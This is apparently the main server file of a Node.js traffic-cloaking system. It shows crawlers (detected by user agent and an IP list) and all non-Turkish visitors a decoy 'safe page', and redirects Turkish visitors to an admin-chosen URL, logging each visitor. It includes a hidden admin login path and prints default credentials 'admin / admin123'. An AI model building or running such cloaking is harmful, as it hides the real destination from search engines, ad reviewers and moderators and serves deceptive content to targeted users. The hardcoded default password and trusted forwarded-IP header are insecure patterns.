const express = require("express");
const geoip = require("geoip-lite");
const UAParser = require("ua-parser-js");
const path = require("path");
const bodyParser = require("body-parser");
const fs = require("fs");
require("dotenv").config();

const db = require("./database");
const {
  sessionMiddleware,
  requireAuth,
  requireAuthApi,
  enhanceSessionSecurity,
} = require("./auth");
const {
  loginLimiter,
  apiLimiter,
  securityHeaders,
  generateCSRFToken,
  validateCSRF,
  sanitizeInput,
  brutForceProtection,
  logFailedAttempt,
  logSuccessfulLogin,
  logAdminActivity,
} = require("./middleware/security");

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware (order matters!)
app.use(securityHeaders);
app.use(bodyParser.json({ limit: "10mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "10mb" }));
app.use(sanitizeInput);
app.use(sessionMiddleware);
app.use(enhanceSessionSecurity);
app.use(generateCSRFToken);
app.use(logAdminActivity);

db.initDatabase().catch(console.error);

// Load bot IPs from file
let botIPs = [];
let botCIDRs = [];

const loadBotIPs = () => {
  try {
    const data = fs.readFileSync(path.join(__dirname, "ips.txt"), "utf8");
    const lines = data
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => line);

    lines.forEach((line) => {
      if (line.includes("/")) {
        // CIDR block
        botCIDRs.push(line);
      } else {
        // Single IP
        botIPs.push(line);
      }
    });

    console.log(
      `Loaded ${botIPs.length} bot IPs and ${botCIDRs.length} CIDR blocks from ips.txt`
    );
  } catch (error) {
    console.error("Error loading bot IPs:", error);
  }
};

// Function to check if IP is in CIDR range
const ipInCIDR = (ip, cidr) => {
  try {
    const [network, prefixLength] = cidr.split("/");
    const prefix = parseInt(prefixLength, 10);

    // Convert IPs to integers for comparison
    const ipToInt = (ip) => {
      return (
        ip
          .split(".")
          .reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0
      );
    };

    const ipInt = ipToInt(ip);
    const networkInt = ipToInt(network);
    const mask = (-1 << (32 - prefix)) >>> 0;

    return (ipInt & mask) === (networkInt & mask);
  } catch (error) {
    return false;
  }
};

// Function to check if IP is a bot IP
const isBotIP = (ip) => {
  // Check single IPs
  if (botIPs.includes(ip)) {
    return true;
  }

  // Check CIDR ranges (only IPv4 for now)
  if (ip.includes(".") && !ip.includes(":")) {
    for (const cidr of botCIDRs) {
      if (cidr.includes(".") && ipInCIDR(ip, cidr)) {
        return true;
      }
    }
  }

  return false;
};

// Load bot IPs on startup
loadBotIPs();

const detectBot = (userAgent) => {
  const botPatterns = [
    /googlebot/i,
    /bingbot/i,
    /slurp/i,
    /duckduckbot/i,
    /baiduspider/i,
    /yandexbot/i,
    /facebookexternalhit/i,
    /twitterbot/i,
    /linkedinbot/i,
    /whatsapp/i,
    /applebot/i,
    /semrushbot/i,
    /ahrefsbot/i,
    /mj12bot/i,
    /dotbot/i,
    /crawler/i,
    /spider/i,
    /bot/i,
  ];

  return botPatterns.some((pattern) => pattern.test(userAgent));
};

const detectMobile = (userAgent) => {
  try {
    const parser = new UAParser(userAgent);
    const device = parser.getDevice();
    const os = parser.getOS();

    // Check if device type is mobile or tablet
    if (device.type === "mobile" || device.type === "tablet") {
      return true;
    }

    // Fallback to OS detection
    const mobileOS = ["iOS", "Android", "Windows Phone", "BlackBerry", "webOS"];
    return mobileOS.includes(os.name);
  } catch (error) {
    // Fallback to regex patterns if parsing fails
    const mobilePatterns = [
      /android/i,
      /webos/i,
      /iphone/i,
      /ipad/i,
      /ipod/i,
      /blackberry/i,
      /windows phone/i,
      /mobile/i,
    ];

    return mobilePatterns.some((pattern) => pattern.test(userAgent));
  }
};

const detectCountry = (ip) => {
  const geo = geoip.lookup(ip);
  return geo ? geo.country : null;
};

const getClientIp = async (req) => {
  const forwarded = req.headers["x-forwarded-for"];
  let ip = forwarded
    ? forwarded.split(",")[0].trim()
    : req.connection.remoteAddress;

  // Check if it's localhost and USE_REAL_IP is enabled
  if ((!ip || ip === "::1" || ip === "127.0.0.1" || ip === "::ffff:127.0.0.1") && 
      process.env.USE_REAL_IP === 'true') {
    try {
      // Get real public IP for testing
      const https = require('https');
      return new Promise((resolve) => {
        https.get('https://api.ipify.org', (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => {
            console.log(`[DEBUG] Real IP detected: ${data.trim()}`);
            resolve(data.trim());
          });
        }).on('error', (err) => {
          console.log('[DEBUG] Could not get real IP, using test IP: 8.8.8.8');
          resolve("8.8.8.8");
        });
      });
    } catch (error) {
      console.log('[DEBUG] Error getting real IP, using test IP: 8.8.8.8');
      return "8.8.8.8";
    }
  }
  
  if (!ip || ip === "::1" || ip === "127.0.0.1" || ip === "::ffff:127.0.0.1") {
    return "8.8.8.8";
  }

  return ip.replace("::ffff:", "");
};

app.use(async (req, res, next) => {
  const userAgent = req.headers["user-agent"] || "";
  const clientIp = await getClientIp(req);
  const country = detectCountry(clientIp);
  const isBot = detectBot(userAgent);
  const isMobile = detectMobile(userAgent);
  const isBotByIP = isBotIP(clientIp);

  req.visitorInfo = {
    ip: clientIp,
    country: country,
    isBot: isBot || isBotByIP, // Bot if either user-agent or IP matches
    isMobile: isMobile,
    userAgent: userAgent,
    isBotByIP: isBotByIP,
  };

  console.log(
    `[${new Date().toISOString()}] IP: ${clientIp}, Country: ${country}, Bot: ${isBot}, BotByIP: ${isBotByIP}, Mobile: ${isMobile}, UA: ${userAgent.substring(
      0,
      50
    )}...`
  );

  next();
});

app.use(express.static("public"));

app.get("/", async (req, res) => {
  const { isBot, country, isMobile, ip, userAgent, isBotByIP } =
    req.visitorInfo;

  if (isBot) {
    const detectMethod = isBotByIP ? "IP-based" : "User-Agent-based";
    console.log(`Bot detected (${detectMethod}) - showing themed safe page`);
    const activeConfig = await db.getActiveRedirectUrl();
    const theme = activeConfig.theme || "business";
    db.logVisitor({
      ip,
      country,
      userAgent,
      isBot,
      isMobile,
      action: "bot_page_shown",
    });
    return res.sendFile(
      path.join(__dirname, "public", "themes", `${theme}.html`)
    );
  }

  if (country === "TR") {
    const activeConfig = await db.getActiveRedirectUrl();
    console.log(
      `Redirecting TR user (${isMobile ? "Mobile" : "Desktop"}) to: ${
        activeConfig.url
      }`
    );
    db.logVisitor({
      ip,
      country,
      userAgent,
      isBot,
      isMobile,
      action: "redirected",
    });
    return res.redirect(activeConfig.url);
  }

  console.log(`Foreign visitor (${country}) - showing themed safe page`);
  const activeConfig = await db.getActiveRedirectUrl();
  const theme = activeConfig.theme || "business";
  db.logVisitor({
    ip,
    country,
    userAgent,
    isBot,
    isMobile,
    action: "safe_page_shown",
  });
  res.sendFile(path.join(__dirname, "public", "themes", `${theme}.html`));
});

app.get("/test-info", (req, res) => {
  res.json(req.visitorInfo);
});

// Admin routes with enhanced security
app.get(
  "/admin/login_path3700193567773f70dd4a299c7d63f600ce1b4a",
  (req, res) => {
    if (req.session.userId) {
      return res.redirect("/admin/dashboard");
    }
    res.sendFile(path.join(__dirname, "public", "admin-login-secure.html"));
  }
);

app.get("/admin/dashboard", requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin-dashboard-enhanced.html"));
});

// Secure API routes
app.post(
  "/api/login",
  loginLimiter,
  brutForceProtection,
  validateCSRF,
  async (req, res) => {
    const { username, password } = req.body || {};
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers["user-agent"];

    try {
      // Input validation
      if (!username || !password) {
        logFailedAttempt(ip, username, userAgent);
        return res
          .status(400)
          .json({ error: "Username and password are required" });
      }

      if (username.length < 3 || password.length < 6) {
        logFailedAttempt(ip, username, userAgent);
        return res.status(400).json({ error: "Invalid credentials format" });
      }

      const user = await db.verifyUser(username, password);

      if (user) {
        // Successful login
        req.session.userId = user.id;
        req.session.username = user.username;
        req.session.role = user.role || "admin";
        req.session.loginTime = new Date().toISOString();
        req.session.expiresAt = Date.now() + 24 * 60 * 60 * 1000; // 24 hours
        req.session.ipAddress = ip;
        req.session.userAgent = userAgent;

        // Log successful login
        logSuccessfulLogin(ip, username, userAgent);

        // Update user last login
        await db.updateUserLastLogin(user.id, ip, userAgent);

        res.json({
          success: true,
          user: {
            username: user.username,
            role: user.role,
            lastLogin: user.last_login,
          },
        });
      } else {
        logFailedAttempt(ip, username, userAgent);

        // Increment brute force tracking
        if (req.bruteForceTrack) {
          req.bruteForceTrack.attempts += 1;
          req.bruteForceTrack.lastAttempt = Date.now();
        }

        res.status(401).json({ error: "Invalid username or password" });
      }
    } catch (error) {
      console.error("Login error:", error);
      logFailedAttempt(ip, username, userAgent);
      res
        .status(500)
        .json({ error: "Authentication service temporarily unavailable" });
    }
  }
);

app.post("/api/logout", requireAuthApi, (req, res) => {
  const username = req.session.username;
  const ip = req.ip || req.connection.remoteAddress;

  // Log logout activity
  console.log(
    `[SECURITY INFO] User logout: ${username} from IP ${ip} at ${new Date().toISOString()}`
  );

  req.session.destroy((err) => {
    if (err) {
      console.error("Session destroy error:", err);
      return res.status(500).json({ error: "Logout failed" });
    }
    res.clearCookie("sessionId");
    res.json({ success: true });
  });
});

// Enhanced API routes with security (GET requests don't need CSRF)
app.get("/api/stats", apiLimiter, requireAuthApi, async (req, res) => {
  try {
    const stats = await db.getVisitorStats();

    // Add security metrics
    const securityStats = {
      ...stats,
      security_alerts: await db.getSecurityAlertCount(),
      blocked_ips: await db.getBlockedIpCount(),
      active_sessions: await db.getActiveSessionCount(),
    };

    res.json(securityStats);
  } catch (error) {
    console.error("Stats error:", error);
    res.status(500).json({ error: "Unable to fetch statistics" });
  }
});

app.get("/api/logs", apiLimiter, requireAuthApi, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 100, 1000); // Max 1000 logs
    const offset = parseInt(req.query.offset) || 0;

    const logs = await db.getVisitorLogs(limit, offset);
    res.json(logs);
  } catch (error) {
    console.error("Logs error:", error);
    res.status(500).json({ error: "Unable to fetch logs" });
  }
});

// New security-focused API endpoints
app.get(
  "/api/security-alerts",
  apiLimiter,
  requireAuthApi,
  async (req, res) => {
    try {
      const alerts = await db.getSecurityAlerts(50); // Last 50 alerts
      res.json({ alerts });
    } catch (error) {
      console.error("Security alerts error:", error);
      res.status(500).json({ error: "Unable to fetch security alerts" });
    }
  }
);

app.get("/api/user-info", apiLimiter, requireAuthApi, async (req, res) => {
  try {
    const user = await db.getUserById(req.session.userId);
    res.json({
      username: user.username,
      role: user.role,
      lastLogin: user.last_login,
      loginCount: user.login_count,
      createdAt: user.created_at,
    });
  } catch (error) {
    console.error("User info error:", error);
    res.status(500).json({ error: "Unable to fetch user information" });
  }
});

app.get("/api/export-logs", apiLimiter, requireAuthApi, async (req, res) => {
  try {
    const logs = await db.getVisitorLogs(10000); // Max 10k for export

    // Convert to CSV
    const csvHeader =
      "timestamp,ip,country,user_agent,is_bot,is_mobile,action\n";
    const csvData = logs
      .map(
        (log) =>
          `${log.timestamp},${log.ip},"${log.country || ""}","${
            log.user_agent
          }",${log.is_bot},${log.is_mobile},${log.action}`
      )
      .join("\n");

    res.setHeader("Content-Type", "text/csv");
    res.setHeader(
      "Content-Disposition",
      'attachment; filename="visitor-logs.csv"'
    );
    res.send(csvHeader + csvData);
  } catch (error) {
    console.error("Export error:", error);
    res.status(500).json({ error: "Export failed" });
  }
});

app.get("/api/redirect-urls", requireAuthApi, async (req, res) => {
  try {
    const urls = await db.getRedirectUrls();
    res.json(urls);
  } catch (error) {
    console.error("URLs error:", error);
    res.status(500).json({ error: "URL'ler alınamadı" });
  }
});

app.post("/api/redirect-urls", requireAuthApi, async (req, res) => {
  const { name, url, theme } = req.body;

  try {
    const newUrl = await db.addRedirectUrl(name, url, theme);
    res.json(newUrl);
  } catch (error) {
    console.error("Add URL error:", error);
    res.status(500).json({ error: "URL eklenemedi" });
  }
});

app.post(
  "/api/redirect-urls/:id/activate",
  requireAuthApi,
  async (req, res) => {
    const { id } = req.params;

    try {
      await db.setActiveRedirectUrl(id);
      res.json({ success: true });
    } catch (error) {
      console.error("Activate URL error:", error);
      res.status(500).json({ error: "URL aktif edilemedi" });
    }
  }
);

app.delete("/api/redirect-urls/:id", requireAuthApi, async (req, res) => {
  const { id } = req.params;

  try {
    await db.deleteRedirectUrl(id);
    res.json({ success: true });
  } catch (error) {
    console.error("Delete URL error:", error);
    res.status(500).json({ error: "URL silinemedi" });
  }
});

app.post("/api/change-password", requireAuthApi, async (req, res) => {
  const { newPassword } = req.body;

  try {
    await db.changePassword(req.session.userId, newPassword);
    res.json({ success: true });
  } catch (error) {
    console.error("Change password error:", error);
    res.status(500).json({ error: "Şifre değiştirilemedi" });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  console.log("Cloaking system active...");
  console.log("Admin panel: http://localhost:" + PORT + "/admin/login");
  console.log("Default admin credentials: admin / admin123");
});
